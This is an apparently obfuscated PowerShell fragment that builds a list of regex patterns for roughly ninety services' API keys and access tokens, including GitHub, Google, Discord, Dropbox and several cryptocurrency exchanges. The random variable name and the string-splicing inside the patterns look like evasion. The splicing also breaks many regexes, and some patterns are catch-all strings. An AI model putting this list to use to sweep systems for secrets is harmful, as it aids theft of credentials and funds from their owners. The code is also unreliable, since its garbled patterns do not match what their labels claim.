  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("BitcoinAverage API Key", "(bitcoin.?average[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9]{43})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Bitquery API Key", "(bitquery[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('A' + '-' + 'Z' + 'a')-z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Bittrex Access Key and Access Key", "([a-z0-9]{32})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Birise API Key", "(bitrise[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9_\-]{86})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Block API Key", "(block[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Blockchain API Key", "mainnet[&('a' + '-' + 'z' + 'A')-Z0-9]{32}|testnet[&('a' + '-' + 'z' + 'A')-Z0-9]{32}|ipfs[&('a' + '-' + 'z' + 'A')-Z0-9]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Blockfrost API Key", "(blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Box API Key", "(box[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Bravenewcoin API Key", "(bravenewcoin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{50})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Clearbit API Key", "sk_[a-z0-9]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Clojars API Key", "(CLOJARS_)[&('a' + '-' + 'z' + 'A')-Z0-9]{60}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Coinbase Access Token", "([a-z0-9_-]{64})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Coinlayer API Key", "(coinlayer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Coinlib API Key", "(coinlib[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{16})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Confluent Access Token & Secret Key", "([a-z0-9]{16})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Contentful delivery API Key", "(contentful[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_\-]{43})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Covalent API Key", "ckey_[a-z0-9]{27}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Charity Search API Key", "(charity.?search[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Databricks API Key", "dapi[a-h0-9]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("DDownload API Key", "(ddownload[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{22})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Defined Networking API token", "(dnkey-[a-z0-9=_\-]{26}-[a-z0-9=_\-]{52})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Discord API Key, Client ID & Client Secret", "((discord[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-h0-9]{64}|[0-9]{18}|[a-z0-9=_\-]{32})['""])")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Droneci Access Token", "([a-z0-9]{32})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Dropbox API Key", "sl.[&('a' + '-' + 'z' + 'A')-Z0-9_-]{136}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Doppler API Key", "(dp\.pt\.)[&('a' + '-' + 'z' + 'A')-Z0-9]{43}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Dropbox API secret/key, short & long lived API Key", "(dropbox[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{15}|sl\.[a-z0-9=_\-]{135}|[a-z0-9]{11}(AAAAAAAAAA)[a-z0-9_=\-]{43})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Duffel API Key", "duffel_(test|live)_[&('a' + '-' + 'z' + 'A')-Z0-9_-]{43}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Dynatrace API Key", "dt0c01\.[&('a' + '-' + 'z' + 'A')-Z0-9]{24}\.[a-z0-9]{64}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("EasyPost API Key", "EZAK[&('a' + '-' + 'z' + 'A')-Z0-9]{54}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("EasyPost test API Key", "EZTK[&('a' + '-' + 'z' + 'A')-Z0-9]{54}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Etherscan API Key", "(etherscan[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{34})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Etsy Access Token", "([a-z0-9]{24})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Facebook Access Token", "EAACEdEose0cBA[0-9A-&('Z' + 'a' + '-' + 'z')]+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Fastly API Key", "(fastly[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_\-]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Finicity API Key & Client Secret", "(finicity[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32}|[a-z0-9]{20})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Flickr Access Token", "([a-z0-9]{32})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Flutterweave Keys", "FLWPUBK_TEST-[&('a' + '-' + 'h' + 'A')-H0-9]{32}-X|FLWSECK_TEST-[&('a' + '-' + 'h' + 'A')-H0-9]{32}-X|FLWSECK_TEST[&('a' + '-' + 'h' + 'A')-H0-9]{12}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Frame.io API Key", "&('f' + 'i' + 'o' + '-' + 'u')-[&('a' + '-' + 'z' + 'A')-Z0-9_=\-]{64}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Freshbooks Access Token", "([a-z0-9]{64})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Github", "github(.{0,20})?['""][0-9a-&('z' + 'A' + '-' + 'Z')]{35,40}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Github App Token", "(ghu|ghs)_[0-9a-&('z' + 'A' + '-' + 'Z')]{36}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Github OAuth Access Token", "gho_[0-9a-&('z' + 'A' + '-' + 'Z')]{36}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Github Personal Access Token", "ghp_[0-9a-&('z' + 'A' + '-' + 'Z')]{36}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Github Refresh Token", "ghr_[0-9a-&('z' + 'A' + '-' + 'Z')]{76}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("GitHub &('F' + 'i' + 'n' + 'e' + '-' + 'G' + 'r' + 'a' + 'i' + 'n' + 'e' + 'd') Personal Access Token", "github_pat_[0-9a-zA-Z_]{82}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Gitlab Personal Access Token", "glpat-[0-9a-&('z' + 'A' + '-' + 'Z')\-]{20}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("GitLab Pipeline Trigger Token", "glptt-[0-9a-f]{40}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("GitLab Runner Registration Token", "GR1348941[0-9a-zA-Z_\-]{20}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Gitter Access Token", "([a-z0-9_-]{40})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("GoCardless API Key", "live_[&('a' + '-' + 'z' + 'A')-Z0-9_=\-]{40}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("GoFile API Key", "(gofile[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Google API Key", "AIza[0-9A-Za-z_\-]{35}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Google Cloud Platform API Key", "(google|gcp|youtube|drive|yt)(.{0,20})?['""][AIza[0-9a-z_\-]{35}]['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Google Drive Oauth", "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Google Oauth Access Token", "ya29\.[0-9A-Za-z_\-]+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Google (GCP) &('S' + 'e' + 'r' + 'v' + 'i' + 'c' + 'e' + '-' + 'a' + 'c' + 'c' + 'o' + 'u' + 'n' + 't')", """type.+:.+""service_account")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Grafana API Key", "eyJrIjoi[a-z0-9_=\-]{72,92}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Grafana cloud api token", "glc_[&('A' + '-' + 'Z' + 'a')-z0-9\+/]{32,}={0,2}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Grafana service account token", "(glsa_[&('A' + '-' + 'Z' + 'a')-z0-9]{32}_[&('A' + '-' + 'F' + 'a')-f0-9]{8})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Hashicorp Terraform user/org API Key", "[a-z0-9]{14}\.atlasv1\.[a-z0-9_=\-]{60,70}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Heroku API Key", "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Hubspot API Key", "['""][a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Instatus API Key", "(instatus[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Intercom API Key & Client Secret/ID", "(intercom[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_]{60}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Ionic API Key", "(ionic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""](ion_[a-z0-9]{42})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("JSON Web Token", "(ey[0-9a-z]{30,34}\.ey[0-9a-z\/_\-]{30,}\.[0-9a-&('z' + 'A' + '-' + 'Z')\/_\-]{10,}={0,2})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Kraken Access Token", "([a-z0-9\/=_\+\-]{80,90})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Kucoin Access Token", "([a-f0-9]{24})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Kucoin Secret Key", "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Launchdarkly Access Token", "([a-z0-9=_\-]{40})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Linear API Key", "(lin_api_[&('a' + '-' + 'z' + 'A')-Z0-9]{40})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Linear Client Secret/ID", "((linear[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32})['""])")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("LinkedIn Client ID", "linkedin(.{0,20})?['""][0-9a-z]{12}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("LinkedIn Secret Key", "linkedin(.{0,20})?['""][0-9a-z]{16}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Lob API Key", "((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]((live|test)_[a-f0-9]{35})['""])|((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]((test|live)_pub_[a-f0-9]{31})['""])")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Lob Publishable API Key", "((test|live)_pub_[a-f0-9]{31})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("MailboxValidator", "(mailbox.?validator[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{20})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Mailchimp API Key", "[0-9a-f]{32}-us[0-9]{1,2}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Mailgun API Key", "key-[0-9a-&('z' + 'A' + '-' + 'Z')]{32}'")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Mailgun Public Validation Key", "pubkey-[a-f0-9]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Mailgun Webhook signing key", "[a-h0-9]{32}-[a-h0-9]{8}-[a-h0-9]{8}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Mapbox API Key", "(pk\.[a-z0-9]{60}\.[a-z0-9]{22})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Mattermost Access Token", "([a-z0-9]{26})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("MessageBird API Key & API client ID", "(messagebird[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{25}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Microsoft Teams Webhook", "https:\/\/[a-z0-9]+\.webhook\.office\.com\/webhookb2\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}@[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}\/IncomingWebhook\/[a-z0-9]{32}\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("MojoAuth API Key", "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Netlify Access Token", "([a-z0-9=_\-]{40,46})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("New Relic User API Key, User API ID & Ingest Browser API Key", "(NRAK-[A-Z0-9]{27})|((newrelic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{64})['""])|(NRJS-[a-f0-9]{19})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Nownodes", "(nownodes[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('A' + '-' + 'Z' + 'a')-z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Npm Access Token", "(npm_[&('a' + '-' + 'z' + 'A')-Z0-9]{36})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Nytimes Access Token", "([a-z0-9=_\-]{32})")
